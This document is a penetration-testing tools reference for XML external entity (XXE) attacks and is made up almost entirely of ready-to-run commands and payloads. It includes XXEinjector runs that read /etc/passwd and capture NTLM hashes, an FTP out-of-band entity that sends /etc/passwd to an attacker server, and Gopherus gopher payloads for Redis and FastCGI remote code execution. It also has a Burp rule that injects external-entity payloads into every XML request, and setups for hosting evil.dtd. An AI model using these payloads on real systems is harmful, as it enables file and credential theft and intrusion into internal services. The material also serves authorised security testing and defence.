# Tools Reference — XXE Testing

## Burp Suite (Core Workflow)

### Step-by-step manual approach:
1. **Find XML requests:** Proxy → HTTP History → filter by Content-Type contains `xml`
2. **Send to Repeater** → manually inject entity payload
3. **Active Scan:** right-click endpoint → Scan → "Audit-only" — detects XXE automatically
4. **Burp Collaborator:** Collaborator tab → Copy to clipboard → use URL in `SYSTEM` declaration for blind detection
5. **BApp: Content Type Converter** (install from BApp Store):
   - Automatically converts JSON requests to XML and retries — finds hidden XML parsers
6. **BApp: Upload Scanner** (install from BApp Store):
   - Tests SVG, DOCX, XLSX uploads for XXE automatically
7. **Burp Match & Replace** — auto-inject XXE into all XML requests:
   - Proxy → Options → Match and Replace → add rule:
   - Match (Regex): `<\?xml version="1\.0".*?\?>`
   - Replace: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://COLLABORATOR-URL"> %x;]>`

---

## XXEinjector

Ruby-based automated XXE tool. Supports OOB, PHP filter, enumeration.

```bash
# Install
gem install xxeinjector
# Or clone: git clone https://github.com/enjoiz/XXEinjector

# Prepare request file (request.txt) — save raw HTTP request from Burp,
# place XXEINJECT marker where the XXE payload should go:
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>XXEINJECT<root><name>test</name></root>

# Basic file read (visible output)
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt

# OOB HTTP exfiltration
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http

# PHP base64 filter (for multi-line files)
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http --phpfilter

# Enumerate directory
ruby XXEinjector.rb --host=YOUR-SERVER --path=/var/www/html/ --file=request.txt --oob=http --enumerate

# NTLM hash capture (Windows targets)
ruby XXEinjector.rb --host=YOUR-SERVER --file=request.txt --oob=http --ntlm

# Verbose output
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http --verbose
```

---

## interactsh — OOB Detection Server

Open-source alternative to Burp Collaborator.

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start — generates a unique OOB domain
interactsh-client

# Output: interactsh server listening at: xxxxx.oast.pro
# Use xxxxx.oast.pro in SYSTEM declarations

# With token (for self-hosted server)
interactsh-client -server https://your-interactsh-server -token YOUR_TOKEN
```

---

## xxe-ftp-server (FTP-based OOB — bypass HTTP egress)

For targets that allow FTP but block HTTP egress:

```bash
# Use scripts/xxe_probe.py built-in FTP server
python3 scripts/xxe_probe.py --ftp-server --port 2121

# Or use xxe-ftp-server standalone
# https://github.com/staaldraad/xxeserv
go get github.com/staaldraad/xxeserv
xxeserv -p 2121
```

**Payload using FTP:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send SYSTEM "ftp://YOUR-SERVER:2121/%file;">
%send;
```

---

## Gopherus — Gopher Payload Generator (XXE → SSRF → internal services)

```bash
# Clone
git clone https://github.com/tarunkant/Gopherus

# Redis RCE payload (writes cron job)
python2 gopherus.py --exploit redis

# FastCGI (PHP-FPM) RCE
python2 gopherus.py --exploit fastcgi

# MySQL
python2 gopherus.py --exploit mysql --lhost YOUR-IP --lport 4444
```

Use generated `gopher://` URL in SYSTEM declaration:

```xml
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/GENERATED_PAYLOAD">
```

---

## xmllint — XML Validation / Formatting

```bash
# Check if XML is valid
xmllint --noout payload.xml
echo $?  # 0 = valid

# Format/pretty-print XML
xmllint --format response.xml

# Decode SAML assertion
echo "PHNhbWxwOlJlc3BvbnNlIHhtbG5z..." | base64 -d | xmllint --format -
```

---

## Python HTTP Server (host evil.dtd)

```bash
# Quick server for evil.dtd hosting
python3 -m http.server 80

# Log all requests
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('[HIT]', self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(open('.' + self.path.split('?')[0], 'rb').read())
    def log_message(self, *a): pass
HTTPServer(('', 80), H).serve_forever()
"
```

---

## ngrok — Public URL for Local Server

```bash
# Expose local port 80 to internet (for evil.dtd hosting)
ngrok http 80

# Output: Forwarding https://xxxx.ngrok.io → http://localhost:80
# Use the ngrok URL in SYSTEM declarations
```

---

## curl — Quick SSRF Test via XXE

```bash
# Test if the target server makes outbound HTTP requests
# 1. Start listener
python3 -m http.server 80

# 2. Send XXE payload
curl -s -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://YOUR-IP/">]><root><data>&xxe;</data></root>'

# Watch listener for incoming request from target server
```

---

## Custom SAML Manipulation

```bash
# Decode SAMLResponse from Burp
python3 -c "
import base64, sys
data = sys.argv[1]
print(base64.b64decode(data).decode())
" "PHNhbWxwOlJlc3BvbnNlIHhtbG5z..."

# Encode modified XML back to base64 + URL-encode
python3 -c "
import base64, urllib.parse, sys
xml = open(sys.argv[1]).read()
enc = base64.b64encode(xml.encode()).decode()
print(urllib.parse.quote(enc))
" modified_saml.xml
```
